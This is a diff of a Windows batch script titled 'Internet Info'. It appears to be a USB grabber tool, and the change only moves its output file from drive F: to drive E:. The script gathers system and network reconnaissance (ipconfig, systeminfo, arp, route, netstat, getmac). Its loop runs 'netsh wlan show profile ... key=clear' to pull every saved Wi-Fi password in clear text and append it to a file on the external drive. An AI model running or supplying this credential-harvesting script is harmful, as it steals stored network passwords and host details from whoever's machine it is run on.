@@ -8,42 +8,42 @@ echo    88    88 V8o88    88    88~~~~~ 88`8b   88 V8o88 88~~~~~    88       88 
 echo   .88.   88  V888    88    88.     88 `88. 88  V888 88.        88      .88.   88  V888 88      `8b  d8' 
 echo Y888888P VP   V8P    YP    Y88888P 88   YD VP   V8P Y88888P    YP    Y888888P VP   V8P YP       `Y88P' 
 echo.
-echo Internet Info >>F:\plik.txt
+echo Internet Info >>E:\plik.txt
 echo Program made by: marcindn
 timeout 1
 echo.
 ipconfig /all
-ipconfig /all >>F:\plik.txt
+ipconfig /all >>E:\plik.txt
 echo.
 netsh wlan show profile
-netsh wlan show profile >>F:\plik.txt
+netsh wlan show profile >>E:\plik.txt
 echo.
 systeminfo 
-systeminfo >>F:\plik.txt
+systeminfo >>E:\plik.txt
 echo.
 arp
-arp >>F:\plik.txt
+arp >>E:\plik.txt
 echo.
 arp -a
-arp -a >>F:\plik.txt
+arp -a >>E:\plik.txt
 echo. 
 route 
-route >>F:\plik.txt
+route >>E:\plik.txt
 echo.
 chcp
-chcp >>F:\plik.txt
+chcp >>E:\plik.txt
 echo.
 vol
-vol >>F:\plik.txt
+vol >>E:\plik.txt
 echo.
 netstat -e
-netstat -e >>F:\plik.txt
+netstat -e >>E:\plik.txt
 echo.
 getmac
-getmac >>F:\plik.txt
+getmac >>E:\plik.txt
 echo.
 route print
-route print >>F:\plik.txt
+route print >>E:\plik.txt
 echo.
 setlocal enabledelayedexpansion
 for /f "tokens=2delims=:" %%a in ('netsh wlan show profile ^|findstr ":"') do (
@@ -61,7 +61,7 @@ for /f "tokens=2delims=:" %%a in ('netsh wlan show profile ^|findstr ":"') do (
 )
 :getpwd
 set "ssid=%*"
-for /f "tokens=2delims=:" %%i in ('netsh wlan show profile name^="%ssid:"=%" key^=clear ^| findstr /C:"Key Content"') do echo ssid: %ssid% pass: %%i >>F:\plik.txt
+for /f "tokens=2delims=:" %%i in ('netsh wlan show profile name^="%ssid:"=%" key^=clear ^| findstr /C:"Key Content"') do echo ssid: %ssid% pass: %%i >>E:\plik.txt
 echo.
 ipconfig /flushdns
 echo.
